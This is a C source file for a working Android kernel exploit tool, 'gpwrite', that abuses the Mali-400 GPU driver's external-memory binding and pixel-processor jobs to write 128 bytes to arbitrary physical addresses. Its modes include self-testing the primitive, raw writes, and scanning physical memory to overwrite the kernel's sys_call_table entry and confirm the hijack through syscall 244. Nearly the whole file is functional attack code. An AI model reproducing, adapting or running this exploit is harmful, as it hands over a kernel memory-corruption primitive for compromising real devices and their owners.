/*
 * gpwrite - Utgard (Mali-400) arbitrary physical 128-byte write, ion-free.
 *
 * /dev/ion's mmap on this firmware returns a bogus address (0x400008) for
 * every request, so the command buffer cannot be filled through ion.  Instead
 * it lives in a plain file page we mmap ourselves; the physical address comes
 * from /proc/self/pagemap and the page is attached to the GPU with the
 * external-memory backend.  __ARM_NR_cacheflush makes the fresh contents
 * visible to the GPU.
 *
 * Modes:
 *   place <off>                         self-test on a page we own
 *   write <phys> <val>                  one 128-byte write
 *   probe <phys>                        write canary, report syscall(244)
 *   scan <start> <end> <step> <canary>  find sys_call_table[244]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

/* Raw syscall: libc folds negative returns into -1/errno, which hides -ENOSYS.
 * For the slot probe we need the real value.  aarch64 variant uses svc inline
 * so the caller's bitness also selects the 64-bit sys_call_table (a 32-bit
 * caller would go through compat_sys_call_table in .text instead). */
static long raw_syscall1(long n, long a)
{
#if defined(__aarch64__)
    register long x8 asm("x8") = n;
    register long x0 asm("x0") = a;
    asm volatile("svc #0" : "+r"(x0) : "r"(x8) : "memory");
    return x0;
#else
    return syscall(n, a);
#endif
}

#define MALI_IOC_MEM_BIND 0xc0288302u
#define MALI_IOC_PP_START_JOB 0xc1988400u
#define MALI_IOC_WAIT_NOTIF 0xc0688202u

#define CMD_VA 0x20000000u
#define EXT_VA 0x40000000u
#define BIND_EXTERNAL (1u << 11)
#define PIXFMT_WB_128 0x06
#define ARM_NR_CACHEFLUSH 0x0f0002
#define MAX_SLOTS 400

struct mali_bind {
    uint64_t ctx;
    uint32_t vaddr, size, flags, padding;
    uint32_t phys_addr, rights, ext_flags, pad2;
};

static void put32(void *b, unsigned off, uint32_t v)
{
    *(uint32_t *)((char *)b + off) = v;
}
static void put64(void *b, unsigned off, uint64_t v)
{
    *(uint64_t *)((char *)b + off) = v;
}

static int mali_fd = -1;
static void *cmd_buf;
static uint32_t cmd_phys[4];

static int pagemap_phys(void *va, uint32_t *out)
{
    int pm = open("/proc/self/pagemap", O_RDONLY);
    if (pm < 0) { perror("pagemap"); return -1; }
    uint64_t e = 0;
    off_t off = ((off_t)(uintptr_t)va / 0x1000) * 8;
    ssize_t n = pread(pm, &e, 8, off);
    close(pm);
    if (n != 8) { perror("pread pagemap"); return -1; }
    if (!(e >> 63)) { fprintf(stderr, "page not present\n"); return -1; }
    *out = (uint32_t)((e & ((1ULL << 55) - 1)) << 12);
    return 0;
}

static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
                       uint32_t word0)
{
    struct mali_bind b;
    memset(&b, 0, sizeof b);
    b.vaddr = vaddr;
    b.size = size;
    b.flags = flags;
    b.phys_addr = word0;
    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
}

static void build_shader(void)
{
    uint32_t *c = (uint32_t *)cmd_buf;
    c[0] = 0;
    c[1] = 0xB8000000u;
    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
    c[3] = 0xB0000000u;
    c[4] = 0;
    c[5] = 0xBC000000u;
    c[6] = 0;
    c[7] = 0;
}

static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
{
    unsigned char b[8];
    memcpy(b, &val, 8);
    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
          ((uint32_t)b[3] << 24);
    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
          ((uint32_t)b[7] << 24);
}

static int setup_cmd(void)
{
    const char *path = "/data/local/tmp/cmdbuf.bin";
    int fd = open(path, O_RDWR | O_CREAT, 0644);
    if (fd < 0) { perror("open cmdbuf"); return -1; }
    if (ftruncate(fd, 0x4000) < 0) { perror("ftruncate"); return -1; }

    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (cmd_buf == MAP_FAILED) { perror("mmap cmdbuf"); return -1; }
    memset(cmd_buf, 0, 0x4000);

    for (int i = 0; i < 4; i++) {
        volatile unsigned char *pg = (volatile unsigned char *)cmd_buf + i * 0x1000;
        *pg = 0;
        if (pagemap_phys((void *)pg, &cmd_phys[i]) < 0)
            return -1;
    }

    mali_fd = open("/dev/mali", O_RDWR);
    if (mali_fd < 0) { perror("open /dev/mali"); return -1; }

    for (int i = 0; i < 4; i++)
        if (bind_region(CMD_VA + i * 0x1000, 0x1000, BIND_EXTERNAL,
                        cmd_phys[i]) < 0) {
            perror("bind cmd page");
            return -1;
        }

    build_shader();
    syscall(ARM_NR_CACHEFLUSH, (unsigned long)cmd_buf,
            (unsigned long)cmd_buf + 0x4000, 0);
    return 0;
}

static int gpu_submit(uint32_t dest, uint64_t val)
{
    uint32_t c0, c1;
    encode_value(val, &c0, &c1);

    static volatile uint32_t done;
    uint8_t job[408];
    memset(job, 0, sizeof job);
    done = 0;

    put64(job, 8, 0x7777);
    put32(job, 20, CMD_VA);
    put32(job, 24, CMD_VA + 0x1000);
    put32(job, 32, 0x02);
    put32(job, 44, c0);
    put32(job, 48, c1);
    put32(job, 52, c0);
    put32(job, 56, c1);
    put32(job, 68, CMD_VA + 0x2000);
    put32(job, 72, (0x400u << 16) | 0x400u);
    put32(job, 84, 1);
    put32(job, 88, 1);
    put32(job, 92, 0x77);
    put32(job, 96, 1);
    put32(job, 104, 0xE0C);
    put32(job, 108, 0x8888);
    put32(job, 168, 0x02);
    put32(job, 172, dest);
    put32(job, 176, PIXFMT_WB_128);
    put32(job, 188, 0);
    put32(job, 200, 0);
    put32(job, 328, 1);
    put32(job, 352, 0);
    put32(job, 396, (uint32_t)-1);
    put64(job, 400, (uint64_t)(uintptr_t)&done);

    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
        return -1;
    uint8_t notif[104];
    memset(notif, 0, sizeof notif);
    if (ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif) < 0)
        return -1;
    usleep(20000);
    return 0;
}

/* Write 128 bytes of `val` at `phys`; each call needs its own GPU VA slot. */
static int write128(uint32_t phys, uint64_t val, int slot)
{
    uint32_t va = EXT_VA + (uint32_t)slot * 0x1000;
    if (bind_region(va, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
        return -1;
    /* The PP job occasionally completes without emitting the burst (seen as
     * "nothing changed" on a page we own), so submit a few times. */
    for (int i = 0; i < 3; i++)
        if (gpu_submit(va + (phys & 0xfffu), val) < 0)
            return -1;
    return 0;
}

/* Flush the CPU caches: sys_call_table is read on every syscall, so its cache
 * line is hot and a GPU (DMA) write to it is invisible until the line is
 * evicted.  Walking a buffer several MB wide forces that eviction. */
static void cache_thrash(void)
{
    static unsigned char *buf;
    const size_t len = 8u << 20;
    if (!buf) {
        buf = mmap(NULL, len, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (buf == MAP_FAILED) { buf = NULL; return; }
        memset(buf, 1, len);
    }
    for (size_t i = 0; i < len; i += 64)
        buf[i] ^= 0x5a;
}

static double now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) {
        fprintf(stderr,
                "usage: %s place <off> | write <phys> <val> | "
                "probe <phys> | scan <start> <end> <step> <canary>\n", argv[0]);
        return 1;
    }
    if (setup_cmd() < 0)
        return 1;

    if (!strcmp(argv[1], "place")) {
        uint32_t off = (uint32_t)strtoul(argv[2], NULL, 16);
        int fd = open("/data/local/tmp/place.bin", O_RDWR | O_CREAT, 0644);
        if (fd < 0) { perror("open place"); return 1; }
        if (ftruncate(fd, 0x1000) < 0) { perror("ftruncate place"); return 1; }
        unsigned char *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                 MAP_SHARED, fd, 0);
        if (pg == MAP_FAILED) { perror("mmap place"); return 1; }
        memset(pg, 0xAA, 0x1000);
        uint32_t phys;
        if (pagemap_phys(pg, &phys) < 0) return 1;
        printf("[*] test page phys=0x%x +0x%x\n", phys, off);
        if (write128(phys + off, 0x1122334455667788ULL, 0) < 0) {
            printf("[!] write failed\n"); return 1;
        }
        int first = -1, last = -1, changed = 0;
        for (uint32_t i = 0; i < 0x1000; i++)
            if (pg[i] != 0xAA) {
                if (first < 0) first = (int)i;
                last = (int)i; changed++;
            }
        int ok = (first == (int)off) && (last == (int)off + 127) && (changed == 128);
        printf("[*] changed [0x%x..0x%x] count=%d %s\n", first, last, changed,
               ok ? "PLACEMENT OK" : "MISMATCH");
        return ok ? 0 : 2;
    }

    if (!strcmp(argv[1], "write")) {
        if (argc < 4) { fprintf(stderr, "write <phys> <val>\n"); return 1; }
        uint32_t phys = (uint32_t)strtoul(argv[2], NULL, 16);
        uint64_t val = strtoull(argv[3], NULL, 16);
        if (write128(phys, val, 0) < 0) { printf("[!] write failed\n"); return 1; }
        printf("[*] wrote 0x%016llx at 0x%x\n", (unsigned long long)val, phys);
        return 0;
    }

    if (!strcmp(argv[1], "probe")) {
        uint32_t phys = (uint32_t)strtoul(argv[2], NULL, 16);
        for (int t = 0; t < 3; t++) {
            if (write128(phys, 0xffffffc0019e643cULL, 0) < 0)
                continue;
            cache_thrash();
            unsigned long r = (unsigned long)raw_syscall1(244, 0);
            printf("[*] try %d: syscall(244) = 0x%lx\n", t, r);
            if (r != (unsigned long)-38) /* -ENOSYS: slot still sys_ni_syscall */
                return 0;
        }
        return 2;
    }

    if (!strcmp(argv[1], "scan")) {
        if (argc < 6) { fprintf(stderr, "scan needs start end step canary\n"); return 1; }
        uint32_t cur = (uint32_t)strtoul(argv[2], NULL, 16);
        uint32_t end = (uint32_t)strtoul(argv[3], NULL, 16);
        uint32_t step = (uint32_t)strtoul(argv[4], NULL, 16);
        uint64_t canary = strtoull(argv[5], NULL, 16);
        /* Which table slot to hit: sys_call_table[nr] sits at page + nr*8.
         * Default 244 (mainline 3.14); this firmware needs 42 (nfsservctl). */
        uint32_t slot_off = (argc >= 7) ? (uint32_t)strtoul(argv[6], NULL, 16) : 0x7a0u;
        long n = 0;
        double t0 = now_ms();
        int slot = 0;

        printf("scan 0x%x..0x%x slot_off=0x%x\n", cur, end, slot_off);
        while (cur < end) {
            if (slot >= MAX_SLOTS) {
                printf("[!] out of VA slots at 0x%x (probes=%ld)\n", cur, n);
                return 1;
            }
            printf("probe 0x%08x\n", cur);
            fflush(stdout);
            if (write128(cur + slot_off, canary, slot) < 0) {
                printf("[!] write failed at 0x%x\n", cur);
                return 1;
            }
            slot++;
            cache_thrash();
            unsigned long r = (unsigned long)raw_syscall1(244, 0);
            n++;
            if (r != (unsigned long)-38) /* -ENOSYS: slot still sys_ni_syscall */ {
                printf("\nHIT 0x%08x -> syscall(244) = 0x%lx\n", cur, r);
                return 0;
            }
            if ((n % 50) == 0) {
                double dt = now_ms() - t0;
                printf("... 0x%08x  %ld probes  %.1f ms/probe\n", cur, n, dt / n);
            }
            cur += step;
        }
        printf("DONE probes=%ld %.1f ms/probe no hit\n", n, (now_ms() - t0) / (n ? n : 1));
        return 2;
    }

    fprintf(stderr, "unknown mode\n");
    return 1;
}







